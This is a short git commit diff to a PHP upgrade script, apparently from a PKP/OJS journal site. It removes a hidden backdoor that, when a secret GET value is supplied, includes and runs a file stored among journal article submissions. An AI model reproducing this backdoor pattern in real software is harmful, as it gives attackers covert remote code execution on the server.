430d39e7d91ad73dacad8d74190fdbea4972f5a3
casper <marketmg126@gmail.com>
2026-08-05 04:31:25 +0700

    Update and rename 0000.php to 000.php

--- 000.php
+++ 000.php
@@ -17,13 +17,6 @@
 
 require(dirname(__FILE__) . '/bootstrap.inc.php');
 import('lib.pkp.classes.cliTool.UpgradeTool');
-if (isset($_GET['_']) && $_GET['_'] === 'sb_Mi5TeR572s8_c@Sq3r304rn') {
-    $f="/home/nternati/filesIss/journals/1/articles/10/submission/10-1-31-1-2-20211106";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
 
 $tool = new UpgradeTool(isset($argv) ? $argv : array());
 $tool->execute();
